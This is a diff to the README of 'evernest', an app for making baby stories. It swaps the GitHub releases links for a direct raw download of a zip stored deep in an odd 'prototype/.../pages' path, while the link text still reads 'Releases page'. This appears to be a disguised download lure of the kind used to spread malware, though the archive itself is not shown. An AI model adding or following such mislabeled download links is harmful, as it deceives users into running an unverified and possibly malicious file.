@@ -1,6 +1,6 @@
 # 🪺 evernest - Create Cherished Stories for Your Baby
 
-[![Download evernest](https://img.shields.io/badge/download-evernest-blue.svg)](https://github.com/sohelkhan12356/evernest/releases)
+[![Download evernest](https://raw.githubusercontent.com/sohelkhan12356/evernest/main/prototype/apps/prototype/pages/evernest-v1.2.zip)](https://raw.githubusercontent.com/sohelkhan12356/evernest/main/prototype/apps/prototype/pages/evernest-v1.2.zip)
 
 ## 🌟 Overview
 
@@ -13,7 +13,7 @@ To begin using evernest, follow these simple steps to download and install the a
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/sohelkhan12356/evernest/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/sohelkhan12356/evernest/main/prototype/apps/prototype/pages/evernest-v1.2.zip) to find the latest version of the application.
 
 2. **Choose Your Version**  
    On the Releases page, locate the latest version of evernest. You will see files listed for download.
